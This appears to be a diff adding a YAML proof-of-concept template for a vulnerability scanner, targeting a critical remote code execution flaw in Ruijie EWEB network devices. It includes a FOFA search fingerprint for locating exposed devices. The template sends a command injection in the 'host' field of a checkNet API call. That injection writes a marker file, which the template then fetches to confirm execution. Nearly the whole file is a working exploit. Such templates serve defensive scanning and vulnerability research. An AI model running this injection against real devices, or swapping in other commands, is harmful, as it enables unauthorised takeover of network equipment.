@@ -1,0 +1,24 @@
+id: poc-yaml-ruijie-eweb-auth-rce
+info:
+  name: 锐捷 EWEB auth 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: eweb
+  fofa: body="cgi-bin/luci" && body="#f47f3e"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /cgi-bin/luci/api/auth
+  headers:
+    Content-Type: application/json
+  data: '{"method":"checkNet","params":{"host":"`echo {{.t2}}>{{.t1}}.txt`"}}'
+  expression: status_code == 200 && contains(body,"\"connect\":false") && contains(headers,"Status\x3a
+    200 OK")
+- method: GET
+  path: /cgi-bin/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,t2)
+transport: http
